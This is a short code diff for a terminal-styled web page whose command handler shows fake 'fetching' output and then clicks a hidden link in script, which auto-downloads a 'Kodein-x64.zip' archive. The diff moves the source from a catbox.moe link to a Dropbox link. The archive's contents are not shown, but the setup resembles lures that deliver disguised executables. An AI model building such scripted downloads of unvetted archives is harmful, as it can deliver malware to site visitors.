@@ -236,11 +236,11 @@ const COMMANDS = {
 <span class="c-dim">${T[lang].dl_fix}</span>
 `);
     // небольшая задержка — имитация "wget"
-    printLines(`<span class="c-dim">fetching https://files.catbox.moe/5z6fzy.zip ...</span>`);
+    printLines(`<span class="c-dim">fetching https://www.dropbox.com/scl/fi/pw500rdrj82mz7agtzn79/Kodein-x64.zip?rlkey=87vpvv40s377s4lgrbfh9xkqk&st=jsgfj7ix&dl=1 ...</span>`);
     setTimeout(() => {
       const a = document.createElement('a');
-      a.href = 'https://files.catbox.moe/5z6fzy.zip';
-      a.download = 'kodein_v4.2.0.zip';
+      a.href = 'https://www.dropbox.com/scl/fi/pw500rdrj82mz7agtzn79/Kodein-x64.zip?rlkey=87vpvv40s377s4lgrbfh9xkqk&st=jsgfj7ix&dl=1';
+      a.download = 'Kodein-x64.zip';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
